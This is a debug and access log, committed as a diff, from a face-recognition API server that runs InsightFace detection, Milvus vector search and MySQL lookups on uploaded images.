+('620620bfac8a2337377a0a07', 'static/96e8a0b85e8911ed8a8bb108c0801c44_620620bfac8a2337377a0a07.jpg')
+path:  ['static/96e8a0b85e8911ed8a8bb108c0801c44_620620bfac8a2337377a0a07.jpg']
+pr>>>>>>>>>>> ['437359909826985994']
+time:  0.19969964027404785
+INFO:     123.24.206.26:36986 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:07:36.858 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 227.2538299560547, id: 437359909826986008)']"]
+2022-11-16 08:07:36.858 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[168.67978    145.56769    477.7221     359.63385      0.74629194]]
+('62fc7496422ac27d7b64d8bc', 'static/4d6e9b4a5e8e11ed8a8bb108c0801c44_62fc7496422ac27d7b64d8bc.jpg')
+path:  ['static/4d6e9b4a5e8e11ed8a8bb108c0801c44_62fc7496422ac27d7b64d8bc.jpg']
+pr>>>>>>>>>>> ['437359909826986008']
+time:  0.1464691162109375
+INFO:     123.24.206.26:56133 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:07:39.950 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 388.119384765625, id: 437359909826986554)']"]
+2022-11-16 08:07:39.951 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[206.59106   216.84381   457.7249    459.95312     0.7984382]]
+('62fc73d3422ac27d7b64a805', 'static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg')
+path:  ['static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg']
+pr>>>>>>>>>>> ['437359909826986554']
+time:  0.14111089706420898
+INFO:     123.24.206.26:58996 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:17:02.384 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:48029 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:17:04.083 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:40263 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:17:07.013 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 351.8945007324219, id: 437359909826986491)']"]
+2022-11-16 08:17:07.014 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[243.66742   129.79489   525.00793   327.77448     0.6133463]]
+('6284680ff6f4201104b3af79', 'static/e6aa46aa616411ed84aaad0224ec19ed_6284680ff6f4201104b3af79_masked.jpg')
+path:  ['static/e6aa46aa616411ed84aaad0224ec19ed_6284680ff6f4201104b3af79_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986491']
+time:  0.1547107696533203
+INFO:     123.24.206.26:33963 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:19:22.802 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 307.3017578125, id: 437359909826986386)']"]
+2022-11-16 08:19:22.802 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[199.74011   247.87785   400.23538   425.96167     0.6893637]]
+('626a1ca315e49f66d33d5c9f', 'static/263c7e26609a11ed84aaad0224ec19ed_626a1ca315e49f66d33d5c9f.jpg')
+path:  ['static/263c7e26609a11ed84aaad0224ec19ed_626a1ca315e49f66d33d5c9f.jpg']
+pr>>>>>>>>>>> ['437359909826986386']
+time:  0.16330575942993164
+INFO:     123.24.206.26:38759 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:22:50.237 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 296.63275146484375, id: 437359909826986120)']"]
+2022-11-16 08:22:50.238 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[181.87794    183.79572    464.1831     475.8871       0.86063427]]
+('61c6c1118d4c8e02a8d838d1', 'static/94a2e9b65f0211ed8a8bb108c0801c44_61c6c1118d4c8e02a8d838d1.jpg')
+path:  ['static/94a2e9b65f0211ed8a8bb108c0801c44_61c6c1118d4c8e02a8d838d1.jpg']
+pr>>>>>>>>>>> ['437359909826986120']
+time:  0.20357513427734375
+INFO:     123.24.206.26:58117 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:23:19.192 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:49880 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:23:28.582 | DEBUG    | module.mysql_helpers:show_image:92 - Mysql search by image: ['62fc729f422ac27d7b647751']
+INFO:     123.24.206.26:42330 - "POST /showimage HTTP/1.1" 200 OK
+INFO:     118.70.171.10:19582 - "GET /6094840e63bc11ed87a1abff41eb4936_62fc729f422ac27d7b647751.jpg HTTP/1.1" 200 OK
+2022-11-16 08:23:31.195 | DEBUG    | module.mysql_helpers:search_data_by_person_id:80 - MYSQL search by person_id: ['62fc729f422ac27d7b647751']
+2022-11-16 08:23:31.205 | DEBUG    | module.mysql_helpers:delete:141 - MYSQL delete id:['437359909826986596', '437359909826986603'] in table:_2090App
+2022-11-16 08:23:31.205 | INFO     | __main__:delete:385 - Successfully delete entity in Milvus and MySQL!
+INFO:     123.24.206.26:41251 - "POST /delete HTTP/1.1" 200 OK
+2022-11-16 08:23:41.926 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 08:23:44.955 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 08:23:44.956 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 08:23:44.961 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 08:23:47.157 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 08:23:50.228 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 08:23:50.228 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 08:23:50.234 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 08:23:50.234 | INFO     | __main__:insert:264 - Masked id [437359909826987663], Non mask id [437359909826987649]
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/4cf9b878654d11ed9b774ba7bb94539d_62fc729f422ac27d7b647751.jpg
+[[0.999997]]
+path image static/4cf9b878654d11ed9b774ba7bb94539d_62fc729f422ac27d7b647751.jpg
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+Total:  10.93405294418335
+INFO:     123.24.206.26:55561 - "POST /insert HTTP/1.1" 200 OK
+2022-11-16 08:24:38.939 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:37475 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:24:42.499 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 250.41690063476562, id: 437359909826986603)']"]
+2022-11-16 08:24:42.499 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[189.44261    207.02475    515.88196    438.38452      0.62956285]]
+path:  []
+<<<<<<<<<<<>>>>>>>>>>>>>>>
+INFO:     123.24.206.26:35754 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:24:44.321 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 249.73977661132812, id: 437359909826986596)']"]
+2022-11-16 08:24:44.322 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[185.2296    203.51529   520.9292    441.61975     0.6337574]]
+path:  []
+<<<<<<<<<<<>>>>>>>>>>>>>>>
+INFO:     123.24.206.26:52125 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:24:50.902 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 310.05841064453125, id: 437359909826987649)']"]
+2022-11-16 08:24:50.903 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[182.81604   171.28677   515.67834   411.42914     0.6008863]]
+('62fc729f422ac27d7b647751', 'static/4cf9b878654d11ed9b774ba7bb94539d_62fc729f422ac27d7b647751.jpg')
+path:  ['static/4cf9b878654d11ed9b774ba7bb94539d_62fc729f422ac27d7b647751.jpg']
+pr>>>>>>>>>>> ['437359909826987649']
+time:  0.13234257698059082
+INFO:     123.24.206.26:61636 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:25:49.896 | ERROR    | module.mysql_helpers:show_image:95 - Mysql error: tuple index out of range with sql: select image_path from _2090App where person_id = %s ;
+INFO:     123.24.206.26:39346 - "POST /showimage HTTP/1.1" 200 OK
+2022-11-16 08:26:16.274 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 08:26:19.810 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 08:26:19.811 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 08:26:19.820 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 08:26:22.040 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 08:26:25.076 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 08:26:25.077 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 08:26:25.086 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 08:26:25.086 | INFO     | __main__:insert:264 - Masked id [437359909826987725], Non mask id [437359909826987711]
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/a8f53dd2654d11ed9b774ba7bb94539d_626a1ca415e49f66d33d5ca3.jpg
+[[0.9970119]]
+path image static/a8f53dd2654d11ed9b774ba7bb94539d_626a1ca415e49f66d33d5ca3.jpg
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+Total:  11.271393060684204
+INFO:     123.24.206.26:55459 - "POST /insert HTTP/1.1" 200 OK
+2022-11-16 08:26:38.690 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 08:26:42.222 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 08:26:42.222 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 08:26:42.232 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 08:26:44.433 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 08:26:47.464 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 08:26:47.464 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 08:26:47.474 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 08:26:47.474 | INFO     | __main__:insert:264 - Masked id [437359909826987753], Non mask id [437359909826987739]
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/b6527a94654d11ed9b774ba7bb94539d_626a1ca415e49f66d33d5ca3.jpg
+[[0.9980412]]
+path image static/b6527a94654d11ed9b774ba7bb94539d_626a1ca415e49f66d33d5ca3.jpg
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+Total:  11.252880811691284
+INFO:     123.24.206.26:39469 - "POST /insert HTTP/1.1" 200 OK
+2022-11-16 08:26:59.051 | DEBUG    | module.mysql_helpers:show_image:92 - Mysql search by image: ['626a1ca415e49f66d33d5ca3']
+INFO:     123.24.206.26:41131 - "POST /showimage HTTP/1.1" 200 OK
+INFO:     123.24.205.224:48730 - "GET /a8f53dd2654d11ed9b774ba7bb94539d_626a1ca415e49f66d33d5ca3.jpg HTTP/1.1" 200 OK
+2022-11-16 08:28:12.612 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 268.09033203125, id: 437359909826986148)']"]
+2022-11-16 08:28:12.612 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[167.48563    202.68097    450.09845    508.76486      0.87708783]]
+('61c6c1e18d4c8e02a8d839b4', 'static/09652a705f0311ed8a8bb108c0801c44_61c6c1e18d4c8e02a8d839b4.jpg')
+path:  ['static/09652a705f0311ed8a8bb108c0801c44_61c6c1e18d4c8e02a8d839b4.jpg']
+pr>>>>>>>>>>> ['437359909826986148']
+time:  0.19099974632263184
+INFO:     123.24.206.26:34426 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:28:22.346 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 196.41598510742188, id: 437359909826987711)']"]
+2022-11-16 08:28:22.346 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[196.47093    198.28432    482.5605     472.9953       0.73886704]]
+('626a1ca415e49f66d33d5ca3', 'static/a8f53dd2654d11ed9b774ba7bb94539d_626a1ca415e49f66d33d5ca3.jpg')
+path:  ['static/a8f53dd2654d11ed9b774ba7bb94539d_626a1ca415e49f66d33d5ca3.jpg']
+pr>>>>>>>>>>> ['437359909826987711']
+time:  0.14427614212036133
+INFO:     123.24.206.26:38654 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     205.210.31.167:59110 - "GET / HTTP/1.1" 404 Not Found
+2022-11-16 08:37:47.251 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:33876 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:37:52.568 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 426.0909423828125, id: 437359909826986470)']"]
+2022-11-16 08:37:52.568 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
